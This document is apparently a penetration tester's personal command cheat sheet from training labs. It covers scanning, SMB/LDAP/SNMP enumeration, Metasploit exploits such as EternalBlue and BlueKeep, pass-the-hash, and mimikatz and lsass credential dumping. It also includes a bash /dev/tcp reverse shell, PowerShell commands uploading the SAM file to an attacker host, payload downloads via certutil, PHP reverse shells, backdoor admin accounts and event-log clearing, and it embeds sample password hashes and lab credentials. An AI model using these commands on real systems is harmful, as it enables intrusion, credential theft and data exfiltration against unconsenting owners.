##############################
########  MONITORING #########
##############################
ifpps -d eth0 
netsniff-ng eth0

##############################
########   VBOX     ##########
##############################
apt-get update 
apt-get install -y virtualbox-guest-x11
reboot

VBoxManage showvminfo default
VBoxManage controlvm default natpf1 "myapp,tcp,,9000,,9000"
VBoxManage modifyvm default --cpus 2
VBoxManage modifyvm default --memory 4096

##############################
####### DOCKER MAC   #########
##############################
brew install docker docker-machine
brew cask install virtualbox
docker-machine create --driver virtualbox default
docker-machine env default
eval "$(docker-machine env default)"
docker run hello-world
docker-machine stop default

##############################
######   OWASP ZAP    ########
##############################
# Domain context regex
^(?:https?:\/\/)?([a-zA-Z0-9\.\-]*)domain\.com([\/\?])?.*

##############################
######## VIM MAGIC ###########
##############################
#select all & copy
:%y+
:%!sed 's/<find>/<replace>/g'
:%!cut -d ' ' -f1
:%!<insert command here>

##############################
###### SCREENSHOT ############
##############################
gnome-screenshot -a -f screenshot.png
eog screenshot.png

##############################
####  CA CERTS          ######
##############################
openssl x509 -inform DER -in <.cer file> -out <.crt file>
mv <.crt file> /usr/local/share/ca-certificates/
update-ca-certificates

##############################
######## MSFCONSOLE ##########
##############################
systemctl start postgresql 
#or
/etc/init.d/postgresql start

msfconsole

msfdb init
msfdb reinit

db_status
workspace
workspace <change to this workspace>
workspace -a <add workspace>
workspace -d <delete workspace>
workspace -h

help

creds

db_export
db_import

creds
hosts
loot
notes <ip>
notes -a -t persistence -n 'run persistence' <ip> 
notes -t persistence
notes -S <search term/regex>
notes -d <host>
services <ip>
services -p <port> -u
# set RHOSTS to results with -R
services -p <port> -u -R 
vulns

fg
bg

#import custom module
mkdir -p $HOME/.msf4/modules/exploits/linux/http/
cp /usr/share/exploitdb/exploits/linux/remote/10610.rb $HOME/.msf4/modules/exploits/linux/http/
vi $HOME/.msf4/modules/exploits/linux/http/10610.rb
#delete header until msf module is real
reload_all


##############################
####### VBOX SHARED DRIVE ####
##############################
sudo mount -t vboxsf VMShared /root/Shared


##############################
##### WHOIS            #######
##############################
whois -h whois.arin.net <orgname>

##############################
##### TCPDUMP          #######
##############################
tcpdump -D #list available interfaces
tcpdump -c 10 -vnni eth0 #verbose, suppress hostname res and portname res
tcpdump -s 0 -X -vnni eth0 #display whole packet 

##############################
##### UNICORN SCAN     #######
##############################
#tcp scan
unicornscan <IP>
#udp scan
unicornscan -m U <IP>
#specify ports
unicornscan -m U -p1-65535 <IP>
^this takes REALLLLY long
##############################
########## NMAP ##############
##############################
#tcpdump for SYNACK while scanning
tcpdump -vnni tun0 'tcp[13] & 2 == 2' and 'tcp[10] & 16 == 16'


db_nmap 10.11.1.49 -p1-65535

ls -al /usr/share/nmap/scripts

# Ping Scan
nmap -sn 10.11.1.1-254 -oG lab-hosts.txt
db_nmap -sn 10.11.1.1-254 -oG lab-hosts.txt

# SYN Scan
nmap -Pn -n -sS 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
db_nmap -Pn -n -sS 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt

grep 445/open lab-syn-top20.txt | cut -d " " -f2 > lab-445-open.txt

# Full Connect Scan 
nmap -Pn -n -sT 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt
db_nmap -Pn -n -sT 10.11.1.1-254 --top-ports 20 -oG lab-syn-top20.txt

# TCP Ping Scan (SYN - SYNACK - RST)
nmap -Pn -n -PS <ip> 

# SERVICE VERSION -- takes a long time
nmap -sV -iL lab-445-open.txt --top-ports 20 -oG lab-windows-versions.txt
db_nmap -sV -iL lab-445-open.txt --top-ports 20 -oG lab-windows-versions.txt

# OS DISCOVERY - SMB NSE - fast
nmap -Pn -n -p 139,445 --script smb-os-discovery.nse -iL lab-445-open.txt -oG lab-smb-os-disc.txt
db_nmap -Pn -n -p 139,445 --script smb-os-discovery.nse -iL lab-445-open.txt -oG lab-smb-os-disc.txt

# Share Enum
nmap -PS445 -p445 --script=smb-enum-shares,smb-ls --script-args=ls.maxdepth=10,smbdomain=<DOMAIN>,smbuser=<USER>,smbpass='<PASSWORD>',smb-ls.share=PubShare <FQDN>

grep Windows lab-smb-os-disc.txt | cut -d " " -f 2 > lab-windows-smb.txt

# Vuln Testing - SMB NSE 
nmap -Pn -n -p 139,445 --script smb-vuln-ms17-010.nse -iL lab-windows-smb.txt -oG lab-windows-smb-ms17010.txt
db_nmap -Pn -n -p 139,445 --script smb-vuln-ms17-010.nse -iL lab-windows-smb.txt -oG lab-windows-smb-ms17010.txt

notes -t nmap.nse.smb-vuln-ms17-010.host

# Web Server Version 
nmap -sV -Pn -n -p 80 --version-trace --version-intensity <0-9> 10.11.1.230
db_nmap -sV -Pn -n -p 80 --version-trace --version-intensity <0-9> 10.11.1.230

nmap -n -A -PN -p- -T Agressive -iL nmap.targetlist -oX nmap.syn.results.xml
n
map -sU -PN -v -O -p 1-30000 -T polite -iL nmap.targetlist > nmap.udp.results
nmap -sU -Pn -T4 -A --top-ports 1000 10.11.1.226
nmap -sU -Pn -sV --top-ports 1000 10.11.1.226



nmap -sV -PN -v -p 21,22,23,25,53,80,443,161 -iL nmap.targets > nmap.version.results
nmap -A -sS -PN -n --script:all ip_address --reason
grep "appears to be up" nmap_saved_filename | awk -F\( '{print $2}' | awk -F\) '{print $1}' > ip_list

# Scan for version, with NSE-scripts and trying to identify OS
nmap 10.11.1.X -sV -sC -O

#faster scanning
masscan -e tun0 -p 1-65535 --rate=200 10.10.10.76
masscan -e tun0 --ports U:1-65535 --rate=200 10.10.10.76
#if you get errors related to router/interface, set router-ip to destination ip (when on same subnet), otherwise use gateway
masscan -p 1-65535 --rate=200 10.50.60.210 -e tap0 --router-ip 10.50.60.210


##############################
##### MAC HOMEBREW SQUID #####
##############################
brew install squid
brew services start squid

##############################
#####   APT PROXY     ########
##############################
cat << 'EOF' > /etc/apt/apt.conf.d/12proxy
Acquire::http::proxy "socks5h://127.0.0.1:1080";
Acquire::https::proxy "socks5h://127.0.0.1:1080";
EOF

cat << 'EOF' > /etc/apt/apt.conf.d/12proxy
Acquire::http::proxy "http://127.0.0.1:3128";
Acquire::https::proxy "http://127.0.0.1:3128";
EOF

##############################
#####   NESSUS        ########
##############################
#nessus registration through http proxy via ssh tunnel
sudo /opt/nessus/sbin/nessuscli fix --secure --set proxy=127.0.0.1
sudo /opt/nessus/sbin/nessuscli fix --secure --set proxy_port=3128

/opt/nessus/sbin/nessuscli fetch --register xxxx-xxxx-xxxx-xxxx

/opt/nessus/sbin/nessuscli lsuser
/opt/nessus/sbin/nessuscli chpasswd username
/opt/nessus/sbin/nessuscli adduser

systemctl start nessusd

##############################
##### NC              ########
##############################
nc -nvzw1 <ip> <port>



##############################
##### DEV TCP BASH    ########
##############################
/bin/bash 0>/dev/tcp/10.11.0.164/443 1>&0 2>&0

##############################
##### AMAP            ########
##############################
#application probing
amap [Mode] [Options] <target> <port/portrange> [<port> ...]

amap -bqv 192.168.1.1 80


##############################
##### XPROBE          ########
##############################
#os identification
xprobe2 192.168.1.1 

##############################
# VFEED (VULNS, NOT SPLOITS) #
##############################
vfeedcli

##############################
##### SEARCH SPLOIT   ########
##############################
searchsploit -u
searchsploit <name>
searchsploit -t <title search only>
searchsploit -t php 5.x | grep -v '/dos/'
searchsploit --colour -t php 5.x | grep -v '/dos/' | grep -iv '\.php[^$]'
##############################
##### SMB ENUMERATION ########
##############################
nbtscan <subnet/24>
nbtscan -r <subnet/24>

enum4linux -a <ip>
enum4linux -o <ip>

python /opt/nullinux/nullinux.py -all <ip>

use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/pipe_auditor
set RHOSTS  <IP>
run 

#mount samba share=> use vers=1.0
mount -v -t cifs -o username=<username>,vers=1.0 //10.81.2.40/users /tmp/smbdir


smb-enum-users.nse
nmap -Pn -n -p 139,445 --script smb-enum-users.nse -iL lab-windows-smb.txt -oG lab-smb-users-enum.txt
db_nmap -Pn -n -p 139,445 --script smb-enum-users.nse -iL lab-windows-smb.txt -oG lab-smb-users-enum.txt

notes -S "account"

ls -l /usr/share/nmap/scripts/smb*

nmblookup -A target
smbclient //MOUNT/share -I target -N
smbclient -L //10.11.1.31/
smbclient //10.10.10.100/Users -t 3 -U SVC_TGS%GPPstillStandingStrong2k18 

prompt off
recurse on
ls
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#get smb version (if your smbclient -V is not 4.6.7)
smbclient -V
#so far these ports have worked, also this seems like it works best for linux
wireshark
port 139 or port 445
#or use tcpdump
tcpdump -vXi tap0 | grep -i -A2 -B2 Samba

smbclient -U "" -L //10.11.1.115/
^do not enter password, view tcp stream, should see SMB/SAMBA server version in tcp stream

# SMB "DIALECTS"
https://msdn.microsoft.com/en-us/library/ee441843.aspx
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

pth-smbclient -U "" -I <ip> //<ip>/<share>
pth-smbclient -U <username>%<hash> //<ip>/<share>

rpcclient -U "" target
	srvinfo
	netshareenum
	getusername
	enumprivs
	enumdomusers
	enumdomgroups
	lookupnames <username>
	lookupnames <groupname> 
	queryuser
	enumalsgroups domain
	enumtrust
	enumdomains

#linux rpc
rpcinfo -p 10.11.1.72

showmount -e <remote_nfs_server>
showmount --all <remote_nfs_server>

mount <remote ip>:<remote folder> <local folder>
mount 192.168.1.126:/exports /local/ubuntu

nmap --script -sV rpc-grind 10.11.1.72
#mehhh ^

##############################
######## LDAP ENUM ###########
##############################
nmap -p 389 --script ldap-rootdse 10.10.10.107

ldapsearch -LLL -x -H ldap://10.10.10.107 -b '' -s base "(objectClass=*)"
ldapsearch -h 10.10.10.107 -p 389 -x -s base -b '' "(objectClass=*)" "*" +
-h ldap server
-p port of ldap
-x simple authentication
-b search base
-s scope is defined as base

ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=example,dc=com"
ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=hackthebox,dc=htb"
ldapsearch -h 10.10.10.107 -p 389 -x -b "dc=hackthebox,dc=htb" sambaNTPassword sambaLMPassword

# list out all object classes
ldapsearch -h 10.81.2.21 -p 389 -x -b "dc=example,dc=com" | grep objectClass | sort | uniq

#Get a list of all domain users
#credentialed
ldapsearch -LLL -x -H ldap://10.10.10.107 -D "jar-jar.binks@pwny.lab" -w Welcome2015 -b "dc=example,dc=com" "(objectClass=user)" sAMAccountNameuserPrincipalNamememberOf

#non credentialed
ldapsearch -LLL -x -H ldap://10.10.10.107 -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName userPrincipalName memberOf

#alternative object class
ldapsearch -LLL -x -H ldap://10.10.10.107 -b "dc=example,dc=com" "(objectClass=person)" sAMAccountName userPrincipalName memberOf


jxplorer


#bloodhound
sudo neo4j console
default creds: neo4j/neo4j
http://localhost:7474/
change password
bloodhound

##############################
### Currently logged in ######
##############################
reg query \\<computername>\HKEY_USERS /s /c /k /e /f "Volatile Environment"

for /F "tokens=*" %F in (computerlist.txt) do START /b reg query \\%F\HKEY_USERS /s /c /k /e /f "Volatile Environment" > sids_%F.txt

for /F "tokens=*" %F in (computerlist.txt) do START /b .\PsLoggedon64.exe -accepteula -nobanner \\%F > psloggedon_%F.txt

##############################
### USER INFO w/SID     ######
##############################
wmic useraccount get * /format:list
wmic useraccount where (sid = "S-1-5-21-1698188384-1693678267-1543859470-6637") get * /format:list

##############################
## IKE Internet Key Exchange #
##############################
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-2/
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-3/

ike-scan <ip> -M -A
	-M multiline
	-A aggressive mode

ike-scan <ip> -M -A --id=groupnamedoesnotexist
ike-scan <ip> -M -A --id=groupnamedoesnotexist -P
	-P return payload (includes hash)

#if you receive DPD (Dead Peer Detection) in response & system is unpatched, group name is correct
#CVE-2013-1194
#DPD can be disabled by configuration, default is enabled

#another way
# 4 isakmp responses = correct group name
# 2 ikakmp responses = incorrect group name

hashcat -m 5300 <psk file> -a 3 ?a?a?a?a?a?a -u 1024 -n 800

#if successful crack, XAUTH still required, in theory can be brute forced



##############################
######## SMTP ENUM ###########
##############################
nc -nv <ip> 25
# wait until you get a header

#check for username
VRFY <username>

smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t 192.168.2.4
tcpdump -Aqi tap0 tcp port 25 | grep VRFY

##############################
##### IDENT ENUM #############
##############################
10.60.16.110  113   tcp    ident  open          
#id which user is running a service
apt-get install ident-user-enum
ident-user-enum 10.60.16.110 22
10.60.16.110:22 0


##############################
######## SNMP ENUM ###########
##############################
# nmap
nmap -sU --open -p 161 10.11.1.1-254 -oG lab-snmp.txt
db_nmap -sU --open -p 161 10.11.1.1-254 -oG lab-snmp.txt

# onesixtyone
echo public > comm-strs.txt
echo private >> comm-strs.txt
echo manager >> comm-strs.txt
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips.txt
onesixtyone -c comm-strs.txt -i ips.txt

# enumerate entire mib tree
snmpwalk -c public -v1 <ip>
snmpwalk -c public -v2c <ip>

## WINDOWS MIBS ##
# users
snmpwalk -c public -v1 <ip> 1.3.6.1.4.1.77.1.2.25
# processes
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2
# open tcp ports
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.6.13.1.3
# Running Programs
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2
# Processes Path
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.4.2.1.4
# Storage Units
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.2.3.1.4
# Software Name
snmpwalk -c public -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2

use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS 10.11.1.73
exploit

/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

##############################
#### FTP ANON ACCESS #########
##############################
nmap -Pn -n -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
db_nmap -Pn -n -v -p 21 --script=ftp-anon.nse 10.11.1.1-254 -oG lab-ftp-anon.txt

anon
anonymous
ftpuser
[blank pass]

ftpuser
ftpuser

notes -S "Anonymous FTP login Allowed"


##############################
####  MS08_067 NET API #######
##############################
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_https
set LHOST 10.11.0.164
set LPORT 4444
set RHOST 10.11.1.227

##############################
#### ETERNALBLUE       #######
##############################
use exploit/windows/smb/ms17_010_eternalblue_win8
set RHOST <ip>
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ip>
set LPORT 8443
set ExitOnSession false
set GroomAllocations 20
run

##############################
#### BLUEKEEP          #######
##############################
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <ip>
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ip>
set LPORT 8443
set GROOMSIZE 50
check


##############################
#### HASHCAT         #########
##############################
hashcat -m 1000 -a0 sambaNTPassword.txt breachcompilation.txt
hashcat -m 3000 -a0 sambaLMPassword.txt breachcompilation.txt
hashcat -O -m 1800 -a0 root.txt breachcompilation.txt
hashcat -m 500 -a0 -O root_sha1.txt breachcompilation.txt


##############################
#### HYDRA     #########
##############################
hydra -L userlist.txt -P passlist.txt -M targets.txt ssh

#http simple authentication brute force
hydra -l Bethany -P mutated.txt -s 9505 -f 10.11.1.49 http-get /~login


##############################
#### SMB PS EXEC     #########
##############################
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.11.1.0/24
set SMBUser Administrator
set SMBPass 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
set THREADS 50

use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_https
set LPORT 4445
set LHOST 10.11.0.164
set RHOST 10.11.1.227
set SMBUser Administrator
set SMBPass 7bfd3ee62cbb0eba886450c5d6c50f12:f3acbe7ec27aadbe8deeaa0c651a64af
set target 2 
^ if no powershell

##############################
#### BYPASS UAC     #########
##############################
use exploit/windows/local/bypassuac
set payload windows/meterpreter/reverse_https
set LHOST 10.11.0.164
set LPORT 443
set SESSION 3
run

###################################
#### HASHDUMP                 #####
###################################
*from meterpreter
run post/windows/gather/smart_hashdump

hashdump


###################################
#### HASHCAT                  #####
###################################

hashcat -m 1000 -a0 sambaNTPassword.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3000 -a0 sambaLMPassword.txt breachcompilation.txt


###################################
#### MIMIKATZ                 #####
###################################
load mimikatz
msv
kerberos
mimikatz_command -f samdump::hashes

mimikatz_command -f handle::list
mimikatz_command -f service::list
mimikatz_command -f privilege::debug
mimikatz_command -f sekurlsa::logonPasswords
mimikatz_command -f samdump::hashes

mimikatz_command -f crypto::listCertificates

mimikatz_command -f event::clear

#new mimi
load kiwi
creds_all


###################################
# Check WDIGEST                   #
###################################

# if UseLogonCredential set to 1, lsass will store clear-text passwords in mem
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential

###################################
####   PROCDUMP               #####
###################################
pip3 install pypykatz

put /opt/sysinternals/procdump64.exe
procdump64 -accepteula -64 -ma lsass.exe lsassdump
get lsassdump.dmp
del lsassdump.dmp
del procdump64.exe
pypykatz lsa minidump lsassdump.dmp



##################################
####  COM SVC DLL LSASS DUMP #####
##################################
tasklist | findstr lsass
#must be SYSTEM
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full

#if you have issues viewing file as regular user
icacls lsass.dmp /grant Everyone:F /inheritance:e /T

#service run command as SYSTEM
sc create cmdsvc binpath="rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> C:\lsass.dmp full" type=own 
sc create cmdsvc binpath="rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 884 C:\lsass.dmp full" type=own 
sc start cmdsvc
sc delete cmdsvc

sc create cmdsvc binpath="icacls C:\lsass.dmp /grant Everyone:F /inheritance:e /T" type=own
sc start cmdsvc
sc delete cmdsvc

#################################
#### GET SYSTEM PROMPT    #######
#################################
#psexec
put psexec.exe
psexec -i -s cmd.exe

sc create cmdsvc binpath="cmd /K start" type=own type=interact
sc start cmdsvc
sc delete cmdsvc





###################################
####   DNS ENUM               #####
###################################
host -t axfr <domain name> <dns server>
host -a <domain name> <dns server>
dig axfr @<dns server> <domain name>
dig mx @<dns server> <domain name>
dig a @<dns server> <domain name>
dig any @<dns server> <domain name>


###################################
####    PROXYCHAINS           #####
###################################
vi /etc/proxychains.conf

use auxiliary/server/socks4a

route add 10.11.1.73 255.255.255.255 1

###################################
####   ssh through socks      #####
###################################
ssh -o "ProxyCommand /usr/bin/nc -X 4 -x 127.0.0.1:8080 %h %p" $@

###################################
####    PORTFWD               #####
###################################
portfwd add -L 127.0.0.1 -l 3306 -r 127.0.0.1 -p 3306
portfwd delete -L 127.0.0.1 -l 3306 -r 127.0.0.1 -p 3306
portfwd

###################################
####  PTH-WINEXE             ######
###################################
pth-winexe -U kevin%aad3b435b51404eeaad3b435b51404ee:3164f206290117d74e9fa582139828d4 //10.11.1.230 cmd
pth-winexe -U kevin%f8uHwN88Sx //10.11.1.230 cmd

###################################
####  wmiexec.py             ######
###################################
python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes :cb5141dcdaa451b097asdfadsfds Administrator@1.2.1.2


use auxiliary/scanner/smb/impacket/wmiexec
set COMMAND ipconfig
set RHOSTS 192.168.217.220
set SMBUser <user>
set SMBPass <pass>




###################################
####   POWERSHELL           #######
###################################
powershell $PSVersionTable.PSVersion
powershell Get-FileHash <filepath> -Algorithm MD5
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.164/FreeSSHD.exe', 'FreeSSHD.exe')

#Data Exfil, Powershell >= 2
powershell -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="""http://<YOUR SPECIFIED IP>/<folder>""";$filepath="""C:\<file>\<to>\<exfil>"""; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);"

powershell -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="""http://10.11.0.164/upload.php""";$filepath="""C:\sam"""; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);"

#for large files... watch them
tcpdump -vnni tap0 tcp port 80

powershell -noprofile -noninteractive -command "1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"
powershell -noprofile -noninteractive -command "21..23 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.75""",$_)) """Port $_ is open!"""} 2>$null"
powershell -noprofile -noninteractive -command "22 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"
powershell -noprofile -noninteractive -command "3306 | % {echo ((new-object Net.Sockets.TcpClient).Connect("""10.1.1.118""",$_)) """Port $_ is open!"""} 2>$null"

C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe Get-MpPreference

###################################
#### FTP DOWNLOAD            ######
###################################
pythom -m SimpleHTTPServer 8443
ftp -o /tmp/linux_met "http://10.91.42.151:8443/linux_met"


###################################
#### CURL                    ######
###################################
curl -F "file=@my_file.txt" http://server/upload.php
curl -i 10.11.1.71
curl -i -L 10.11.1.71
curl 10.11.1.71 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
curl 10.11.1.71 -s -L | html2text -width '99' | uniq
curl -i http://10.11.1.71/cgi-bin/admin.cgi -s | html2text

#LFI search
curl 'http://10.11.1.71/cgi-bin/admin.cgi' -i -s > before
curl 'http://10.11.1.71/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd' -i -s > after
diff --color before after

#for large files... watch them
tcpdump -vnni tap0 tcp port 80


###################################
#### CERTUTIL DOWNLOAD    #########
###################################
certutil -urlcache -split -f "http://192.168.230.130:8080/something.exe" C:\ScheduledTasks\Task1\something.exe

###################################
#### SIMPLE PHP UPLOAD       ######
###################################
*see ~/PWK/homemade/upload.php
cp ~/PWK/homemade/upload.php /var/www/html
service apache2 start
*use curl/powershell/etc to post file

mkdir /var/www/html/uploads
chgrp www-data /var/www/html/uploads
chmod 775 /var/www/html/uploads

#For large file uploads....
locate php.ini
/etc/php/7.0/apache2/php.ini
/etc/php/7.0/cli/php.ini
/etc/php/7.2/apache2/php.ini
/etc/php/7.2/cli/php.ini
#^change the below variables in all of these files
post_max_size = 40M
upload_max_filesize = 40M
#restart your webserver
service apache2 restart

###################################
#### PHP STUFF                #####
###################################
<?php phpinfo(); ?>

#php shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.131 LPORT=443 EXITFUNC=thread -e php/base64 -f raw -o shell.php
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -o'
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

##############################
####### WEB CERT #############
##############################
openssl s_client -connect 10.11.90.128:8443 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > ../10.11.90.128/mycert.pem

wget https:/server.edu:443/somepage --ca-certificate=mycertfile.pem


##############################
####### WEBSOCKET    #########
##############################
websocat wss://10.11.90.134:8443/coreserver/ws -k

##############################
####### APACHE VHOST #########
##############################
#can only be accessed by url
#need to add named websites to hosts file
#use passive scanner to look for websites being visited
#if multiple names resolve to the same addr -> name based website

echo "<ip> <fqdn>" >> /etc/hosts

dig axfr @<dns ip> <fqdn> +nostat +nocomments +nocmd
#^find other names on the same ip via zone transfer

##############################
####### APACHE JSERV #########
##############################
apt install libapache2-mod-jk
a2enmod proxy_ajp

vi /etc/apache2/sites-enabled/ajp.conf
ProxyRequests Off
# Only allow localhost to proxy requests
<Proxy *>
Order deny,allow
Deny from all
Allow from localhost
</Proxy>
# Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance
ProxyPass                 / ajp://10.60.11.36:8009/
ProxyPassReverse    / ajp://10.60.11.36:8009/

service apache2 start


###################################
#### SAMDUMP2                ######
###################################
reg save hklm\sam c:\sam
reg save hklm\system c:\system
#exfil....
samdump2 system sam

###################################
#### NET                     ######
###################################
net view /domain
net view /domain:<domain to search>
net user /domain
net user <user> <pass> /add
net localgroup "Administrators" <user> /add
NET LOCALGROUP "Remote Desktop Users" hacked /ADD
net accounts /domain
net localgroup "Administrators"
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net share
#active smb sessions
net session | find / "\\"
#unlock domain user account
net user <user> /ACTIVE:yes /domain
#change domain user password
net user <user> "<newpass>" /domain
#share a folder
net share <share> c:\share /GRANT:Everyone,FULL
net user <user> /delete
#services that are started
net start

###################################
#### Drivers                 ######
###################################
DRIVERQUERY 
^look for 3rd party drivers, could be priv esc'able

###################################
#### SC                      ######
###################################
sc qc Spooler

###################################
#### QWINSTA                 ######
###################################
#check for logged in users
qwinsta


###################################
#### NETSH                   ######
###################################
netsh advfirewall firewall show rule name=all status=enabled
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"

netsh dump

netsh interface portproxy add v4tov4 listenport=8001 listenaddress=192.168.0.10 connectport=80 connectaddress=192.168.0.10
netsh interface portproxy delete v4tov4 listenport=8001 listenaddress=192.168.0.10
netsh interface portproxy show all
###################################
####  WINDOWS SNMP CONFIG    ######
###################################
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

###################################
####  SCHTASKS               ######
###################################
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v 2>nul
schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc once /st 14:18 /sd 11/13/2002

#https://amonsec.net/2018/10/20/Common-Windows-Misconfiguration-Scheduled-Tasks.html

Get-ScheduledTask

#ignore default scheduled tasks
Get-ScheduledTask | Select * | ? {$_.TaskPath -notlike "\Microsoft\Windows\*"} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}

#ignore tasks at your priv level
Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, Task
Path, TaskName, @{Name="User";Expression={$_.Principal.userID}}

#get task execution interval
$task= Get-ScheduledTask -TaskName Task1
ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}

#get task actions
$task= Get-ScheduledTask -TaskName Task1
ForEach ($action in $task.Actions) { Select $action.Execute}

accesschk64.exe -accepteula -wv <username> <path to task bin>




###################################
####   WEVTUTIL / WECUTIL    ######
###################################
#Enum Logs
wevtutil el
#Enum Log Config
wevtutil gl <log name>
#Enum Publishers
wevtutil ep
#Get Publisher Config
wevtutil gp <publisher name>
#Clear Log
wevtutil cl <log name>
#Query Event in Log
wevtutil qe <log name>
#Count c, Reverse Direction (newest log first) rd
wevtutil qe <log name> /c:1 /rd:true /f:Text
#Query specific event id
wevtutil qe <log name> /q:"*[System[(EventID=7045)]]" /c:5 /f:text /rd:true

#enum Windows Event Forwarding Subscriptions
wecutil es

###################################
####   WMIC                  ######
###################################
# Windows Management Instrumentation Command-line
https://andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/
# Alias list
wmic alias list brief 
# OS Arch
wmic os get osarchitecture 
wmic cpu get AddressWidth 
# Processor Arch
wmic cpu get DataWidth    
# Last Boot Time
wmic os get lastbootuptime
# Local Time
wmic os get LocalDateTime
# Groups/Users Info
wmic useraccount list
wmic useraccount list brief
wmic sysaccount list
wmic sysaccount list brief
wmic group list
wmic group list brief
wmic /user:Ã¢â‚¬FOREIGN_DOMAINAdminÃ¢â‚¬ /password:Ã¢â‚¬PasswordÃ¢â‚¬ /node:192.168.33.25 group list brief
# Currently Logged in users
wmic computersystem get username
# Process List
wmic process list
wmic process list brief
# Software versions
wmic product get name,version
# Start/Terminate an Application
wmic process call create "calc.exe"
wmic process where name="calc.exe" call terminate
# Environment
wmic environment list
# Turn on Remoted Desktop
Wmic /node:Ã¢â‚¬servernameÃ¢â‚¬ /user:Ã¢â‚¬user@domainÃ¢â‚¬ /password: Ã¢â‚¬Å“passwordÃ¢â‚¬ RDToggle where ServerName=Ã¢â‚¬server nameÃ¢â‚¬ call SetAllowTSConnections 1
wmic RDToggle call SetAllowTSConnections 1
^ need to figure these out a little more....
# Startup List
wmic startup list full
wmic startup list brief
# Patch Management
wmic qfe list
wmic qfe get Caption,Description,HotFixID,InstalledOn
# Shares
wmic share list
# NICS
wmic nicconfig list
wmic nicconfig list brief
# Services 
wmic service list
wmic service list brief
wmic service get caption, name, startmode, state
wmic service where "state='running'" get caption, name, startmode, state
# Event Logs
wmic os get LocalDateTime
wmic ntevent where TimeGenerated > 'YYYYMMDDHHmmSS.uuuuuu-ZZZ'
wmic ntevent WHERE "TimeGenerated > '20180329122658.618000-420'" GET TimeGenerated
wmic ntevent WHERE "LogFile='security' AND TimeGenerated > '20180329122658.618000-420'" GET TimeGenerated
wmic ntevent where "message like '%logon%" GET TimeGenerated
#Y 	Year
#M 	Month
#D 	Day
#H 	Hour
#m 	Minute
#S 	Second
#u 	Microsecond
#- 	Literally, a -
#Z 	Timezone offset in minutes from UTC (not hours)
#shadow copy
wmic shadowcopy call create Volume=C:\
{
        ReturnValue = 0;
        ShadowID = "{B6063AED-3F9B-4A75-B16E-6B1AFCDAD6CB}";
};

